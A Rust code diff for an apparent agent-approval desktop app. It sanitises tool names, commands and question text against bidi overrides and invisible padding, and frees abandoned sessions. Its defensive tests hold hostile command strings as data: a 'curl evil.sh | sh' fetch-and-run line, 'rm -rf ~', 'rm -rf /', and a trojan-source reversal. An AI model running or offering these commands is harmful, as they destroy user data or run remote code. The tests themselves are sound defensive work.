@@ -208,11 +208,7 @@ async fn post_event(
     event.summary = match event.summary.take() {
         Some(raw) => non_empty(summarize::clean(&raw)),
         None if event.event == EventKind::TurnComplete && event.agent == AgentKind::ClaudeCode => {
-            event
-                .transcript_path
-                .as_deref()
-                .and_then(|p| adapters::claude_code::last_assistant_message(Path::new(p)))
-                .and_then(|raw| non_empty(summarize::clean(&raw)))
+            transcript_summary(event.transcript_path.clone()).await
         }
         None => None,
     };
@@ -238,15 +234,103 @@ async fn post_event(
     }
 }
 
+/// Completion summary read back from the transcript, for a Stop hook that
+/// carried no `last_assistant_message` (§5.1).
+///
+/// `transcript_path` comes verbatim out of the request body, and reading it
+/// is blocking file I/O plus JSONL parsing over a 256 KB tail. None of that
+/// may run on an async worker: a worker parked in `open()` on a FIFO is a
+/// worker gone for good, and enough of them stop the runtime — ingest stops
+/// accepting and every parked approval stops waking. The adapter refuses
+/// anything that is not a regular file; this keeps even the legitimate read
+/// off the reactor. Cleaning happens inside the same blocking hop, since it
+/// walks the same 256 KB.
+async fn transcript_summary(transcript_path: Option<String>) -> Option<String> {
+    let path = transcript_path.filter(|p| !p.is_empty())?;
+    tauri::async_runtime::spawn_blocking(move || {
+        adapters::claude_code::last_assistant_message(Path::new(&path))
+            .map(|raw| summarize::clean(&raw))
+    })
+    .await
+    .ok()
+    .flatten()
+    .and_then(non_empty)
+}
+
+/// Hand a session that was waiting on the user back to Working, for a park
+/// that ended WITHOUT a decision: an approval that timed out, or a shim that
+/// died mid-park. `record_decision` covers the only path that ends in an
+/// answer; every other one used to leave the row reading "waiting on you"
+/// until the app restarted.
+///
+/// Off the reactor, because `clear_attention_state` takes the registry lock
+/// and writes to SQLite while the callers are `Drop` guards that can run on
+/// an async worker as a cancelled handler future is torn down.
+///
+/// It must not resurrect a session that has legitimately moved on, which is
+/// why both checks happen when the task RUNS rather than when it is queued:
+///
+///   * a sibling card still parked for this session owns the attention state
+///     — clearing it would report "working" underneath a card that is still
+///     up. Same rule the `decide` command applies before resuming;
+///   * `clear_attention_state` only ever unsticks a session still sitting in
+///     NeedsAttention, so one that has since gone working/done/ended is
+///     untouched — including the ordinary decided path, where the decision
+///     already moved it and this is a no-op.
+///
+/// One window the sibling check does NOT cover: `post_approval` and
+/// `post_question` both call `registry.apply` (→ NeedsAttention) before
+/// `broker.register`, so a release landing between those two calls for a
+/// DIFFERENT park in the same session sees nothing pending and reports
+/// working under a card about to be pinned. Two microsecond-wide windows have
+/// to overlap for it, and the next event for that session corrects it —
+/// closing it properly means registering the park before applying the event,
+/// which is a change to the broker's contract rather than to this function.
+fn release_attention(
+    session_id: String,
+    registry: Arc<Registry>,
+    broker: Arc<Broker>,
+    app: Option<AppHandle>,
+) {
+    tauri::async_runtime::spawn_blocking(move || {
+        release_attention_now(&session_id, &registry, &broker, app.as_ref());
+    });
+}
+
+/// The blocking half, so it can be tested without a runtime.
+fn release_attention_now(
+    session_id: &str,
+    registry: &Registry,
+    broker: &Broker,
+    app: Option<&AppHandle>,
+) {
+    if broker.has_pending_for_session(session_id) {
+        return;
+    }
+    if !registry.clear_attention_state(session_id) {
+        return;
+    }
+    let (Some(app), Some(session)) = (app, registry.get(session_id)) else {
+        return;
+    };
+    if let Err(err) = app.emit("session-updated", session) {
+        log::warn!("failed to emit session-updated: {err}");
+    }
+}
+
 /// Cleanup that also runs when the parked handler future is CANCELLED (the
 /// shim's connection died mid-wait: user hit Esc, closed the terminal, agent
 /// crashed). Without it the pinned card would be stranded — clickable, on
-/// top of the screen, forever. Both calls are idempotent, so running after a
+/// top of the screen, forever. Every call is idempotent, so running after a
 /// normal decision/timeout is harmless.
 struct ApprovalCleanup {
     id: String,
+    session_id: String,
     broker: Arc<Broker>,
     overlay: Option<Arc<Overlay>>,
+    registry: Arc<Registry>,
+    /// None only in unit tests, which have no Tauri app to reach.
+    app: Option<AppHandle>,
 }
 
 impl Drop for ApprovalCleanup {
@@ -255,6 +339,16 @@ impl Drop for ApprovalCleanup {
         if let Some(overlay) = &self.overlay {
             overlay.unpin_approval(&self.id);
         }
+        // The card is gone; the ROW must stop saying "waiting on you" too.
+        // This runs on every exit from the handler, so it covers the timeout
+        // and the cancelled-mid-park cases alike — after `expire` above, so
+        // the pending check inside can never see the entry we just retired.
+        release_attention(
+            self.session_id.clone(),
+            self.registry.clone(),
+            self.broker.clone(),
+            self.app.clone(),
+        );
     }
 }
 
@@ -272,17 +366,31 @@ async fn post_approval(
     if !authorized(&headers, &state.token) {
         return StatusCode::UNAUTHORIZED.into_response();
     }
-    let event: NormalizedEvent = match serde_json::from_slice(&body) {
+    let mut event: NormalizedEvent = match serde_json::from_slice(&body) {
         Ok(event) => event,
         Err(err) => {
             log::warn!("dropping malformed approval payload: {err}");
             return StatusCode::BAD_REQUEST.into_response();
         }
     };
+    // Clean the summary exactly like the other two ingest paths do: whatever
+    // arrives here is inserted into the events table by `apply` below. Our
+    // own shim hardcodes `"summary": null` on this route, so today this can
+    // only be a no-op — but §9 invariant 4 is enforced at INGRESS precisely
+    // so that no change upstream of us can violate it, and this handler was
+    // the hole in that argument.
+    event.summary = event
+        .summary
+        .take()
+        .and_then(|raw| non_empty(summarize::clean(&raw)));
     let Some(tool) = &event.tool else {
         log::warn!("approval request without tool payload dropped");
         return StatusCode::BAD_REQUEST.into_response();
     };
+    // Capped and sanitized here, at the boundary, like every other external
+    // string: this one is spoken, rendered on the card, logged, and spoken
+    // again by `speaker::decision_text` after the decision.
+    let tool_name = cap(&tool.name, MAX_TOOL_NAME_CHARS);
 
     // Voice-only degraded mode (overlay failed to init): there is no way to
     // decide, so parking would just stall the agent for 110 s. Fall straight
@@ -311,18 +419,21 @@ async fn post_approval(
         event_id,
         agent: event.agent,
         title: session.title.clone(),
-        tool_name: tool.name.clone(),
-        tool_summary: tool_summary(&tool.name, &tool.input),
+        tool_summary: tool_summary(&tool_name, &tool.input),
+        tool_name,
     });
     let _cleanup = ApprovalCleanup {
         id: info.id.clone(),
+        session_id: session.id.clone(),
         broker: state.broker.clone(),
         overlay: state.overlay.clone(),
+        registry: state.registry.clone(),
+        app: Some(state.app.clone()),
     };
     log::info!(
         "approval {} pending: {} in session {}",
         info.id,
-        info.tool_name,
+        loggable_tool_name(&info.tool_name),
         info.session_id
     );
 
@@ -356,6 +467,10 @@ async fn post_approval(
             log::info!("approval {} decided: {}", info.id, decision.as_str());
             axum::Json(serde_json::json!({ "decision": decision.as_str() })).into_response()
         }
+        // Nothing to undo in the registry here: `_cleanup` drops as this
+        // function returns and releases the attention state for exactly this
+        // case (a park that ended with no decision). Doing it twice would
+        // just be two trips through the same lock.
         None => {
             log::info!("approval {} timed out; falling back to terminal", info.id);
             if let Some(overlay) = &state.overlay {
@@ -383,6 +498,13 @@ const MAX_QUESTION_CHARS: usize = 500;
 const MAX_HEADER_CHARS: usize = 80;
 const MAX_LABEL_CHARS: usize = 200;
 const MAX_DESCRIPTION_CHARS: usize = 500;
+
+/// A tool name is an identifier (`Bash`, `mcp__server__tool`), not prose —
+/// but it arrives in a payload like everything else, and it is spoken,
+/// rendered on the card, and spoken again with the decision. The `Bash`/
+/// `apply_patch` dispatch in `tool_summary` matches on it too, so trimming
+/// here also means a padded name still routes to the right summary.
+const MAX_TOOL_NAME_CHARS: usize = 64;
 
 /// Guards the park against there being no way to answer: without a card,
 /// every AskUserQuestion would stall for 110 s before falling through. True
@@ -427,14 +549,19 @@ fn parse_question_body(
             return Err("question with empty text".into());
         }
         q.header = cap(&q.header, MAX_HEADER_CHARS);
-        // Drop blanks BEFORE capping the count: truncating first could keep
-        // twelve empty labels and leave a card with nothing to click.
-        q.options.retain(|o| !o.label.trim().is_empty());
-        q.options.truncate(MAX_OPTIONS);
+        // Three steps, and the order of all three matters. Cap the TEXT
+        // first: a label of nothing but zero-width characters is not
+        // `trim`-empty (they are not White_Space), so testing it before the
+        // cap let it through to render as a blank, unclickable option. Then
+        // drop the blanks, and only then cap the COUNT — truncating first
+        // could keep twelve empty labels and leave a card with nothing to
+        // click.
         for o in &mut q.options {
             o.label = cap(&o.label, MAX_LABEL_CHARS);
             o.description = cap(&o.description, MAX_DESCRIPTION_CHARS);
         }
+        q.options.retain(|o| !o.label.trim().is_empty());
+        q.options.truncate(MAX_OPTIONS);
         if q.options.is_empty() {
             // Claude always offers 2–4 options; none means a drifted or junk
             // payload. Refuse rather than park an unanswerable card.
@@ -450,8 +577,31 @@ fn parse_question_body(
     Ok((event, questions, tool_use_id))
 }
 
+/// Neutralize and truncate in ONE pass, so the `max` characters we keep are
+/// `max` VISIBLE characters: a payload cannot spend the budget on invisible
+/// padding to push the real text off the card, and a 2 MB question body is
+/// scanned but never copied (see `summarize::sanitize_capped`).
 fn cap(s: &str, max: usize) -> String {
-    s.trim().chars().take(max).collect()
+    summarize::sanitize_capped(s, max).0
+}
+
+/// What is safe to put in a log line for a tool name. §9 invariant 2 is "log
+/// event kinds only", and this string is payload-controlled: a name shaped
+/// like an identifier is genuinely useful when reading logs, anything else is
+/// reported by shape and nothing else.
+fn loggable_tool_name(name: &str) -> &str {
+    // Same budget the name itself is capped at, so a legitimately long MCP
+    // name (`mcp__some_server__some_tool`) still reads as itself in the log.
+    let identifier = !name.is_empty()
+        && name.len() <= MAX_TOOL_NAME_CHARS
+        && name
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '.'));
+    if identifier {
+        name
+    } else {
+        "<non-identifier tool name>"
+    }
 }
 
 /// Cleanup that also runs when the parked handler future is CANCELLED (shim
@@ -460,10 +610,12 @@ fn cap(s: &str, max: usize) -> String {
 /// the request that created it. Idempotent.
 struct QuestionCleanup {
     id: String,
+    session_id: String,
     /// None only in unit tests, which have no Tauri app to reach.
     app: Option<AppHandle>,
     broker: Arc<Broker>,
     overlay: Option<Arc<Overlay>>,
+    registry: Arc<Registry>,
 }
 
 impl Drop for QuestionCleanup {
@@ -485,6 +637,16 @@ impl Drop for QuestionCleanup {
         if let Some(app) = &self.app {
             crate::reply::expire_for(app, &self.id);
         }
+        // And the row stops saying "waiting on you". Covers the timeout, the
+        // "answer in the terminal" defer, and the shim dying mid-park; a
+        // question that was actually ANSWERED has already been moved to
+        // Working by `record_decision`, which makes this a no-op there.
+        release_attention(
+            self.session_id.clone(),
+            self.registry.clone(),
+            self.broker.clone(),
+            self.app.clone(),
+        );
     }
 }
 
@@ -556,9 +718,11 @@ async fn post_question(
     );
     let _cleanup = QuestionCleanup {
         id: info.id.clone(),
+        session_id: session.id.clone(),
         app: Some(state.app.clone()),
         broker: state.broker.clone(),
         overlay: state.overlay.clone(),
+        registry: state.registry.clone(),
     };
     log::info!(
         "question {} pending: {} question(s) in session {}",
@@ -666,6 +830,9 @@ async fn park_until<T>(
     }
 }
 
+/// One line of card.
+const TOOL_SUMMARY_CHARS: usize = 160;
+
 /// The primary input worth showing for a tool call (AC-6.1), truncated for
 /// the card. Derived data — never logged (§9).
 fn tool_summary(tool_name: &str, input: &serde_json::Value) -> String {
@@ -682,8 +849,16 @@ fn tool_summary(tool_name: &str, input: &serde_json::Value) -> String {
         "apply_patch" => patch_summary(input["command"].as_str().unwrap_or_default()),
         _ => serde_json::to_string(input).unwrap_or_default(),
     };
-    let mut out: String = primary.chars().take(160).collect();
-    if out.chars().count() < primary.chars().count() {
+    // This is the string the user is authorizing — the one surface where
+    // "what it renders as" and "what will run" must be the same thing. A bidi
+    // override in here reverses the tail of the command on the card while the
+    // agent executes the original, and zero-width padding pushes the real
+    // command past the cap. One pass closes both: the 160 characters kept are
+    // 160 VISIBLE ones, and the ellipsis (load-bearing here — it is what says
+    // "there is more command than this") reports what that pass actually
+    // dropped.
+    let (mut out, truncated) = summarize::sanitize_capped(&primary, TOOL_SUMMARY_CHARS);
+    if truncated {
         out.push('…');
     }
     out
@@ -775,7 +950,36 @@ fn dispatch_callout(speaker: &SpeakerHandle, event: &NormalizedEvent, session: &
 mod tests {
     use super::*;
     use crate::broker::{Answer, AnswerResult, QuestionAnswer, QuestionInfo};
+    use crate::registry::SessionState;
     use std::time::Duration;
+
+    /// A registry on a real (temporary) database — `Registry::open` is the
+    /// only constructor visible from here.
+    fn test_registry() -> (Arc<Registry>, tempfile::TempDir) {
+        let dir = tempfile::tempdir().unwrap();
+        let registry = Registry::open(&dir.path().join("t.db"), crate::titles::TitleIndex::empty())
+            .expect("registry must open");
+        // The TempDir is returned so it outlives the database file.
+        (Arc::new(registry), dir)
+    }
+
+    fn normalized(kind: &str, session_id: &str) -> NormalizedEvent {
+        serde_json::from_value(serde_json::json!({
+            "agent": "claude-code",
+            "event": kind,
+            "session_id": session_id,
+            "cwd": "/tmp/pmb",
+        }))
+        .unwrap()
+    }
+
+    /// Park a session on the user, the way `/v1/approval` does.
+    fn parked_session(registry: &Registry, session_id: &str) {
+        let (session, _) = registry
+            .apply(&normalized("permission_request", session_id), |_| {})
+            .unwrap();
+        assert_eq!(session.state, SessionState::NeedsAttention);
+    }
 
     /// Real budgets, compressed ~1000x so the tests exercise the same code
     /// paths in milliseconds. The RATIOS are what matters: base < ceiling,
@@ -1278,16 +1482,322 @@ mod tests {
         // mid-park, so the guard must free the broker entry (and, once wired,
         // unpin the card) instead of stranding it.
         let broker = Arc::new(Broker::default());
+        let (registry, _dir) = test_registry();
+        parked_session(&registry, "s1");
         let (info, _rx) = broker.register_question(parked_question(), test_deadline());
         {
             let _cleanup = QuestionCleanup {
                 id: info.id.clone(),
+                session_id: "s1".into(),
                 app: None,
                 broker: broker.clone(),
                 overlay: None,
+                registry: registry.clone(),
             };
         }
         assert!(!broker.has_pending_for_session("s1"));
         assert!(broker.expire_question(&info.id).is_none());
+        // …and the row stops claiming the user still owes it an answer. The
+        // guard hands that off to a blocking task, so give it a moment.
+        assert!(
+            wait_for_working(&registry, "s1").await,
+            "an abandoned park must release the session"
+        );
+    }
+
+    /// Poll for the state the guard's spawned task will publish. Cheap enough
+    /// to be generous: a wrong answer here fails, it does not hang.
+    async fn wait_for_working(registry: &Registry, session_id: &str) -> bool {
+        for _ in 0..200 {
+            if registry.get(session_id).map(|s| s.state) == Some(SessionState::Working) {
+                return true;
+            }
+            tokio::time::sleep(Duration::from_millis(10)).await;
+        }
+        false
+    }
+
+    /// The approval guard owes the same release — this is the `kill -9`
+    /// case for a tool call rather than a question.
+    #[tokio::test]
+    async fn an_abandoned_approval_releases_the_session_too() {
+        let broker = Arc::new(Broker::default());
+        let (registry, _dir) = test_registry();
+        parked_session(&registry, "s1");
+        let (info, _rx) = broker.register(ApprovalInfo {
+            id: String::new(),
+            session_id: "s1".into(),
+            event_id: 1,
+            agent: AgentKind::ClaudeCode,
+            title: "ask-spike".into(),
+            tool_name: "Bash".into(),
+            tool_summary: "cargo test".into(),
+        });
+        {
+            let _cleanup = ApprovalCleanup {
+                id: info.id.clone(),
+                session_id: "s1".into(),
+                broker: broker.clone(),
+                overlay: None,
+                registry: registry.clone(),
+                app: None,
+            };
+        }
+        assert!(!broker.has_pending_for_session("s1"));
+        assert!(wait_for_working(&registry, "s1").await);
+    }
+
+    /// The release must not resurrect a session that has legitimately moved
+    /// on, and must not speak for a sibling card that is still up.
+    #[test]
+    fn releasing_attention_respects_siblings_and_sessions_that_moved_on() {
+        let broker = Arc::new(Broker::default());
+        let (registry, _dir) = test_registry();
+        parked_session(&registry, "s1");
+
+        // A second approval is still parked for the same session: it owns the
+        // attention state until IT ends.
+        let (sibling, _rx) = broker.register(ApprovalInfo {
+            id: String::new(),
+            session_id: "s1".into(),
+            event_id: 2,
+            agent: AgentKind::ClaudeCode,
+            title: "ask-spike".into(),
+            tool_name: "Bash".into(),
+            tool_summary: "rm -rf build".into(),
+        });
+        release_attention_now("s1", &registry, &broker, None);
+        assert_eq!(
+            registry.get("s1").map(|s| s.state),
+            Some(SessionState::NeedsAttention),
+            "a card still on screen must keep the row waiting"
+        );
+
+        // Sibling gone: now the release lands.
+        assert!(broker.expire(&sibling.id).is_some());
+        release_attention_now("s1", &registry, &broker, None);
+        assert_eq!(
+            registry.get("s1").map(|s| s.state),
+            Some(SessionState::Working)
+        );
+
+        // A session that has since finished its turn must not be dragged
+        // back to "working" by a late guard.
+        registry
+            .apply(&normalized("turn_complete", "s2"), |_| {})
+            .unwrap();
+        release_attention_now("s2", &registry, &broker, None);
+        assert_eq!(registry.get("s2").map(|s| s.state), Some(SessionState::Done));
+
+        // Nor may an unknown session invent one.
+        release_attention_now("never-seen", &registry, &broker, None);
+        assert!(registry.get("never-seen").is_none());
+    }
+
+    /// BUG 1: the transcript fallback opens a path taken verbatim from the
+    /// request body. Anything that is not a regular file must be refused
+    /// before `open()`, and the whole read must be off the async worker.
+    #[tokio::test]
+    async fn the_transcript_fallback_refuses_anything_but_a_regular_file() {
+        assert_eq!(transcript_summary(None).await, None);
+        assert_eq!(transcript_summary(Some(String::new())).await, None);
+        assert_eq!(
+            transcript_summary(Some("/nonexistent/t.jsonl".into())).await,
+            None
+        );
+
+        let dir = tempfile::tempdir().unwrap();
+        assert_eq!(
+            transcript_summary(Some(dir.path().to_string_lossy().into_owned())).await,
+            None,
+            "a directory is not a transcript"
+        );
+
+        #[cfg(unix)]
+        {
+            // The runtime-killer: `open()` on a FIFO blocks until a writer
+            // appears. If this regresses, the timeout fires instead of the
+            // whole suite hanging.
+            let fifo = dir.path().join("fifo.jsonl");
+            assert!(std::process::Command::new("mkfifo")
+                .arg(&fifo)
+                .status()
+                .expect("mkfifo")
+                .success());
+            let refused = tokio::time::timeout(
+                Duration::from_secs(5),
+                transcript_summary(Some(fifo.to_string_lossy().into_owned())),
+            )
+            .await;
+            assert_eq!(
+                refused.expect("the fallback must never block on a FIFO"),
+                None
+            );
+
+            // `/dev/zero` stats as length 0 and never ends: the old code read
+            // it until the allocator gave up. Safe to assert on because the
+            // adapter's `take(TAIL_BYTES)` bound would still hold even if the
+            // `is_file` guard were removed (see its test module).
+            let zero = tokio::time::timeout(
+                Duration::from_secs(5),
+                transcript_summary(Some("/dev/zero".into())),
+            )
+            .await;
+            assert_eq!(zero.expect("must not read /dev/zero"), None);
+        }
+
+        // The happy path still works, and comes back cleaned.
+        let transcript = dir.path().join("t.jsonl");
+        std::fs::write(
+            &transcript,
+            "{\"type\":\"assistant\",\"message\":{\"content\":[{\"type\":\"text\",\"text\":\"**Done!** All tests pass.\"}]}}\n",
+        )
+        .unwrap();
+        assert_eq!(
+            transcript_summary(Some(transcript.to_string_lossy().into_owned())).await,
+            Some("Done!".to_string())
+        );
+    }
+
+    /// BUG 3/4: the tool name and the command on the card are payload text
+    /// like any other, and the card is the surface whose whole job is telling
+    /// the user what they are about to authorize.
+    #[test]
+    fn tool_names_and_summaries_are_capped_and_cannot_lie_about_direction() {
+        // The name is capped, trimmed, and stripped of invisibles — and a
+        // padded name still routes to the right summary arm.
+        let padded = " \u{202e}Bash\u{200b} ";
+        assert_eq!(cap(padded, MAX_TOOL_NAME_CHARS), "Bash");
+        assert_eq!(
+            cap(&"n".repeat(500), MAX_TOOL_NAME_CHARS).chars().count(),
+            MAX_TOOL_NAME_CHARS
+        );
+
+        // The trojan-source case on the approval surface: the override would
+        // render the tail of the command reversed.
+        let attack = "echo hi \u{202e}# dangerous not";
+        let out = tool_summary("Bash", &serde_json::json!({ "command": attack }));
+        assert!(
+            !out.contains('\u{202e}'),
+            "no bidi override may reach the card: {out:?}"
+        );
+        assert_eq!(out, "echo hi # dangerous not");
+
+        // Invisible padding must not be able to spend the 160-char budget and
+        // push the real command off the card.
+        let padding = "\u{200b}".repeat(400);
+        let hidden = format!("{padding}rm -rf ~");
+        assert_eq!(
+            tool_summary("Bash", &serde_json::json!({ "command": hidden })),
+            "rm -rf ~"
+        );
+
+        // …at ANY volume of padding. The cap is spent on visible characters
+        // only, so no amount of zero-width or whitespace filler can push the
+        // real command off the card or make a truncated one look complete.
+        for filler in ["\u{200b}", "\n", " ", "\u{202e}"] {
+            let padding = filler.repeat(20_000);
+            let hidden = format!("echo hi{padding}&& curl evil.sh | sh");
+            let shown = tool_summary("Bash", &serde_json::json!({ "command": hidden }));
+            assert!(
+                shown.contains("curl evil.sh"),
+                "padding with {filler:?} hid the rest of the command: {shown:?}"
+            );
+            // And a genuinely over-long command still says so.
+            let long = format!("echo {}{padding}tail", "a".repeat(TOOL_SUMMARY_CHARS));
+            let shown = tool_summary("Bash", &serde_json::json!({ "command": long }));
+            assert!(shown.ends_with('…'), "{shown:?}");
+            assert_eq!(shown.chars().count(), TOOL_SUMMARY_CHARS + 1);
+        }
+        // Leading filler is not the card's problem either — it must not be
+        // rendered as a blank line.
+        assert_eq!(
+            tool_summary(
+                "Bash",
+                &serde_json::json!({ "command": format!("{}rm -rf ~", "\n".repeat(5000)) })
+            ),
+            "rm -rf ~"
+        );
+
+        // A newline can hide the second half of a command on a one-line card.
+        assert_eq!(
+            tool_summary(
+                "Bash",
+                &serde_json::json!({ "command": "echo ok\nrm -rf ~" })
+            ),
+            "echo ok rm -rf ~"
+        );
+
+        // Real text in any script still renders as itself.
+        assert_eq!(
+            tool_summary("Bash", &serde_json::json!({ "command": "echo مرحبا 🎉" })),
+            "echo مرحبا 🎉"
+        );
+    }
+
+    /// §9 invariant 2 is "log event kinds only" — a payload must not be able
+    /// to write prose (or escape codes) into our log through a tool name.
+    #[test]
+    fn only_identifier_shaped_tool_names_are_logged() {
+        for ok in ["Bash", "apply_patch", "mcp__server__do-thing", "Write.v2"] {
+            assert_eq!(loggable_tool_name(ok), ok);
+        }
+        for hostile in [
+            "",
+            "rm -rf /",
+            "Bash\u{1b}[2J",
+            "why is this a sentence in my log",
+            &"x".repeat(MAX_TOOL_NAME_CHARS + 1),
+        ] {
+            assert_eq!(loggable_tool_name(hostile), "<non-identifier tool name>");
+        }
+    }
+
+    /// BUG 4, question side: every string a question card renders passes
+    /// through `cap`.
+    #[test]
+    fn question_text_is_neutralized_at_ingress() {
+        let body = question_body(serde_json::json!([{
+            "question": "Delete \u{202e}?stset eht\u{202c} really",
+            "header": "Con\u{200b}firm",
+            "options": [
+                {"label": "Yes\u{202e}", "description": "runs\u{feff} it"},
+                {"label": "No", "description": ""}
+            ]
+        }]));
+        let (_, questions, _) = parse_question_body(&body).unwrap();
+        let rendered = format!(
+            "{}{}{}{}",
+            questions[0].question,
+            questions[0].header,
+            questions[0].options[0].label,
+            questions[0].options[0].description
+        );
+        assert!(
+            !rendered
+                .chars()
+                .any(|c| matches!(c, '\u{202a}'..='\u{202e}' | '\u{200b}' | '\u{feff}')),
+            "no invisible or bidi control may survive into a card: {rendered:?}"
+        );
+        assert_eq!(questions[0].header, "Confirm");
+        assert_eq!(questions[0].options[0].label, "Yes");
+
+        // A label made only of zero-width characters is blank without being
+        // `trim`-empty, so it used to survive the blank check and render as
+        // an unclickable option. It must be dropped like any other blank —
+        // and a question left with no usable option at all falls back to the
+        // terminal rather than parking a dead card.
+        let (_, questions, _) = parse_question_body(&question_body(serde_json::json!([{
+            "question": "Pick one",
+            "options": [{"label": "\u{200b}\u{feff}"}, {"label": "Real"}]
+        }])))
+        .unwrap();
+        assert_eq!(questions[0].options.len(), 1);
+        assert_eq!(questions[0].options[0].label, "Real");
+        assert!(parse_question_body(&question_body(serde_json::json!([{
+            "question": "Pick one",
+            "options": [{"label": "\u{200b}"}]
+        }])))
+        .is_err());
     }
 }
